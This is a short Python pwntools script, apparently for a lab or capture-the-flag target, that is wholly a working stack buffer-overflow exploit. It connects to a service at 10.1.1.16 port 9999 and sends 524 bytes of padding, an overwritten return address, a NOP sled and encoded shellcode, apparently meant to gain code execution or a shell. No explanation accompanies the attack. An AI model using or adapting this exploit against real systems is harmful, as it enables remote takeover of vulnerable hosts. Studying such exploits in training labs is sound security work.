from pwn import *
#context.log_level = 'DEBUG'

r = remote('10.1.1.16', 9999)


shellcode =  b""
shellcode += b"\xba\x43\x75\x72\x1b\xda\xc9\xd9\x74\x24\xf4\x58\x31"
shellcode += b"\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\x13\x7b\x90"
shellcode += b"\xee\xa2\x58\xa3\xf2\x97\x1d\x1f\x9f\x15\x2b\x7e\xef"
shellcode += b"\x7f\xe6\x01\x83\x26\x48\x3e\x69\x58\xe1\x38\x88\x30"
shellcode += b"\xf8\xbb\x6b\x8a\x94\xb9\x6b\x2d\x6a\x37\x8a\x81\x12"
shellcode += b"\x17\x1c\xb2\x69\x94\x17\xd5\x43\x1b\x75\x7d\x32\x33"
shellcode += b"\x09\x15\xa2\x64\xc2\x87\x5b\xf2\xff\x15\xcf\x8d\xe1"
shellcode += b"\x29\xe4\x40\x61"

payload = 'A' * 524 + p32(0x311712f3)  + '\x90' * 16  + shellcode

r.sendafter('>> ', payload)
